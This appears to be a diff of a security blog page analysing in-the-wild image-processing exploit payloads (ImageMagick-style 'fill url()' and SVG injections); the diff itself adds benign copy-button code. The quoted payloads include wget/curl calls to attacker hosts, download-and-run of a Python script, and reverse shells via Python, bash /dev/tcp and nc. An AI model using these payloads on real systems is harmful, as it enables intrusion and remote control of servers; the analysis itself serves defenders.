@@ -26,20 +26,50 @@
 <p>The most common payload contains the following snippet:</p>
 <div class="emdash-code">
 	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">fill</span><span class="sk-032f62-99ffe4"> 'url(https://pre09.example.net/15bd/th/pre/f/2012/237/c/7/all_work_and_no_something</span></span>
-<span class="line"><span class="sk-032f62-99ffe4">someting_by_nebezial-d5cdlor.jpg";curl "example.com)'</span></span></code></pre>
+<span class="line"><span class="sk-032f62-99ffe4">someting_by_nebezial-d5cdlor.jpg";curl "example.com)'</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
+<script type="module">
+	globalThis.process ??= {}, globalThis.process.env ??= {}, document.querySelectorAll(`[data-code-copy]`).forEach(e => {
+		let t = e.closest(`.emdash-code`)?.querySelector(`pre code`);
+		if (!t) return;
+		let n = e.dataset.copyLabel ?? ``,
+			r = e.dataset.copiedLabel ?? ``,
+			i = null;
+		e.addEventListener(`click`, () => {
+			navigator.clipboard.writeText(t.textContent ?? ``).then(() => {
+				e.setAttribute(`data-copied`, ``), e.setAttribute(`aria-label`, r), i && clearTimeout(i), i = setTimeout(() => {
+					e.removeAttribute(`data-copied`), e.setAttribute(`aria-label`, n), i = null
+				}, 1500)
+			}).catch(e => {
+				console.warn(`code-copy: clipboard write failed`, e)
+			})
+		})
+	});
+</script>
 <p>This particular payload should not cause any damage as the curl command just returns the text of a 301 Moved Permanently HTTP error. The attacker may have been using this as a way of testing whether the exploit worked on a specific website. Once they know that something works they can come back and try to break into the server using a more complex payload.</p>
 <p>The next payload looks like it might similarly be used for reconnaissance:</p>
 <div class="emdash-code">
 	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">image xlink:href</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">"https://127.0.0.1/image.jpg"</span><span class="sk-d73a49-a0a0a0">|</span><span class="sk-6f42c1-ffc799">wget</span><span class="sk-032f62-99ffe4"> xx.xx.116.214/loltest</span><span class="sk-24292e-fff">;</span><span class="sk-6f42c1-ffc799">" </span></span>
-<span class="line"><span class="sk-6f42c1-ffc799">x="</span><span class="sk-6f42c1-ffc799">0</span><span class="sk-6f42c1-ffc799">" y="</span><span class="sk-6f42c1-ffc799">0</span><span class="sk-6f42c1-ffc799">" height="</span><span class="sk-6f42c1-ffc799">140px</span><span class="sk-6f42c1-ffc799">" width="</span><span class="sk-6f42c1-ffc799">140px</span><span class="sk-6f42c1-ffc799">"/&gt;</span></span></code></pre>
+<span class="line"><span class="sk-6f42c1-ffc799">x="</span><span class="sk-6f42c1-ffc799">0</span><span class="sk-6f42c1-ffc799">" y="</span><span class="sk-6f42c1-ffc799">0</span><span class="sk-6f42c1-ffc799">" height="</span><span class="sk-6f42c1-ffc799">140px</span><span class="sk-6f42c1-ffc799">" width="</span><span class="sk-6f42c1-ffc799">140px</span><span class="sk-6f42c1-ffc799">"/&gt;</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>The wget command results in a 404 Not Found error (although there might have been a real file downloaded at some point). Even with a 404 error an attacker can look through their own server logs (of the server at xx.xx.116.214) to discover the IP address of any website on which the payload worked. They can then return to the website later to attack it properly.</p>
 <h3>Remote Access</h3>
 <p>Another style of payload looks like this:</p>
 <div class="emdash-code">
 	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">fill</span><span class="sk-032f62-99ffe4"> 'url(https://127.0.0.0/sdfsdf.jpg"|wget -o- a0074942.example.com/dfgdfg &gt;</span></span>
-<span class="line"><span class="sk-032f62-99ffe4">"/tmp/dfgfdgfdg)'</span></span></code></pre>
+<span class="line"><span class="sk-032f62-99ffe4">"/tmp/dfgfdgfdg)'</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>The attacker downloads a file (presumably from a server they control) using wget and saves it to a file on the website’s server. This could be the prelude to a larger attack and the contents of the temporary file would likely contain a program to be executed on the web server giving the attacker access.</p>
 <figure class="emdash-image pt-portable-image" data-astro-cid-7nvefuv6="">
@@ -49,7 +79,11 @@
 <p>A much more dangerous payload was very popular with attackers over the weekend:</p>
 <div class="emdash-code">
 	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">fill</span><span class="sk-032f62-99ffe4"> 'url(https://example.com/image.jpg"|wget http://example.com/x.py </span></span>
-<span class="line"><span class="sk-032f62-99ffe4">-o /tmp/x.py &amp;&amp; python /tmp/x.py xx.xx.15.179 80")'</span></span></code></pre>
+<span class="line"><span class="sk-032f62-99ffe4">-o /tmp/x.py &amp;&amp; python /tmp/x.py xx.xx.15.179 80")'</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>This downloads a python program called <code>x.py</code> from a server the attack controls, saves it as <code>/tmp/x.py</code> and then executes it. The parameters to the program are the IP address and port of a machine to contact. The python code connects to that machine and makes a shell available on the web server to the attacker. At that point the attacker can interact directly with the web server.</p>
 <p>Here’s a snippet of the downloaded program:</p>
@@ -88,14 +122,22 @@
 <span class="line"><span class="sk-6f42c1-ffc799">    s.close</span><span class="sk-24292e-fff">()</span></span>
 <span class="line"></span>
 <span class="line"><span class="sk-d73a49-a0a0a0">if</span><span class="sk-6f42c1-ffc799"> __name__</span><span class="sk-032f62-99ffe4"> ==</span><span class="sk-032f62-99ffe4"> '__main__':</span></span>
-<span class="line"><span class="sk-6f42c1-ffc799">    main</span><span class="sk-24292e-fff">()</span></span></code></pre>
+<span class="line"><span class="sk-6f42c1-ffc799">    main</span><span class="sk-24292e-fff">()</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>A variant of this payload eliminates the need to download the python program and includes it in the payload itself:</p>
 <div class="emdash-code">
 	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">fill</span><span class="sk-032f62-99ffe4"> 'url(https://example.com/image.jpg"|/bin/echo -e \'import</span><span class="sk-24292e-fff"> </span></span>
 <span class="line"><span class="sk-6f42c1-ffc799">socket\x2csubprocess\x2cos</span><span class="sk-24292e-fff">;s</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">socket.socket</span><span class="sk-24292e-fff">(</span><span class="sk-6f42c1-ffc799">socket.af_inet\x2csocket.sock_stream</span><span class="sk-24292e-fff">);</span></span>
 <span class="line"><span class="sk-6f42c1-ffc799">s.connect((</span><span class="sk-6f42c1-ffc799">"xx.xx.24.85"</span><span class="sk-6f42c1-ffc799">\x2c443</span><span class="sk-24292e-fff">));p</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">subprocess.call</span><span class="sk-24292e-fff">(</span><span class="sk-6f42c1-ffc799">\x5b</span><span class="sk-6f42c1-ffc799">"/bin/sh"</span><span class="sk-6f42c1-ffc799">\x2c</span><span class="sk-6f42c1-ffc799">"-i"</span><span class="sk-6f42c1-ffc799">\x5d</span><span class="sk-24292e-fff">);</span><span class="sk-6f42c1-ffc799">\</span><span class="sk-6f42c1-ffc799">'</span></span>
-<span class="line"><span class="sk-6f42c1-ffc799">&gt; /dev/shm/a.py|python "/dev/shm/a.py)'</span></span></code></pre>
+<span class="line"><span class="sk-6f42c1-ffc799">&gt; /dev/shm/a.py|python "/dev/shm/a.py)'</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>Getting access to the server via a shell or other connection proved popular with attackers who used payloads like this:</p>
 <div class="emdash-code">
@@ -103,7 +145,11 @@
 <span class="line"><span class="sk-032f62-99ffe4">0&lt;&amp;1 2&gt;&amp;1")'</span></span>
 <span class="line"></span>
 <span class="line"><span class="sk-6f42c1-ffc799">fill</span><span class="sk-032f62-99ffe4"> 'url(https://profile-photos.example.com/production/000/003/658/b4eb8_</span></span>
-<span class="line"><span class="sk-032f62-99ffe4">xtralarge.png"|nc -e /bin/sh xx.xx.151.208</span></span></code></pre>
+<span class="line"><span class="sk-032f62-99ffe4">xtralarge.png"|nc -e /bin/sh xx.xx.151.208</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>The first uses <a href="http://linux.die.net/man/1/setsid" target="_blank" rel="noopener noreferrer">setsid</a> to create a new session and then hooks up the bash shell to a TCP connection back to the hacker’s server. The second uses <a href="http://linux.die.net/man/1/nc" target="_blank" rel="noopener noreferrer">nc</a> to attempt the same thing.</p>
 <p>All these payloads are designed to give the hacker unfettered access to the vulnerable web server. With a single exploit they can get remote access and then proceed to further hack the vulnerable web server at their leisure.</p>
